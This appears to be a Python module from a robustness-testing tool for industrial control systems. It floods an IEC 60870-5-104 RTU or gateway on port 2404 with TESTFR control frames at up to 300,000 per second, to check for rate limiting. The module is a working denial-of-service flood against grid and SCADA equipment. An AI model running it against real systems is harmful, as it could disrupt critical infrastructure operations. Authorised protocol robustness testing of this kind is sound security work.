"""
測項：IEC104 TESTFR (Test Frame) 高頻率洪水
分類：IEC 60870-5-104
說明：TESTFR act 是 IEC 60870-5-104 標準本身定義的 U-format 控制訊框（協定內建的
     連線存活測試/心跳機制），標準位元組序列為固定值 `68 04 43 00 00 00`。
     這裡以受控速率重複送出，測試 Controlled Station（RTU/閘道器）對控制訊框的
     處理能力，以及是否有速率限制或連線保護機制。

實作說明：
  - APDU 格式：START(0x68) + APDU長度(1 byte=4) + 控制欄位(4 bytes)。
    U-format 訊框固定 4 bytes 長度，這是標準規定的定值，不需要另外計算。
  - 這是應用層等級的合法控制訊框（不是自訂/偽造的協定內容），高頻率重複發送
    屬於「協定內建機制濫用型」的健壯性測試，與 Slowloris 利用 HTTP 標準行為
    做壓力測試的性質類似。
需求：無額外套件，純標準函式庫。
"""
import socket
import time

from ..common import RateLimiter, clamp_duration

NAME = "IEC104 TESTFR 高頻率洪水"
CATEGORY = "IEC 60870-5-104"
PROTOCOL = "TCP"
DEFAULT_PORT = 2404
TEST_TYPE = "traffic"  # 流量型：TESTFR U-format 控制訊框洪水，靠封包速率本身造成負擔

_TESTFR_ACT = bytes.fromhex("680443000000")  # START, LEN=4, CTRL(4 bytes) = TESTFR act


def get_param_schema() -> dict:
    return {
        "rate_per_sec": {"type": "int", "default": 300000, "min": 1, "max": 300000, "desc": "每秒送出訊框數"},
    }


def run(target, port, protocol, duration, params, stop_event, log_fn):
    duration = clamp_duration(duration)
    rate = int(params.get("rate_per_sec", 350))

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3.0)
        sock.connect((target, port))
    except OSError as e:
        log_fn(f"[!] 無法連線 {target}:{port}: {e}")
        return {"sent": 0, "error": str(e)}

    limiter = RateLimiter(rate)
    sent, errors = 0, 0
    start = time.time()

    log_fn(f"[+] 開始送出 IEC104 TESTFR act @ {rate}/s")
    while time.time() - start < duration and not (stop_event and stop_event.is_set()):
        limiter.wait()
        try:
            sock.sendall(_TESTFR_ACT)
            sent += 1
        except OSError as e:
            errors += 1
            if errors <= 5:
                log_fn(f"[!] send error: {e}")
            break

    sock.close()
    return {"frames_sent": sent, "errors": errors, "elapsed_sec": round(time.time() - start, 1)}
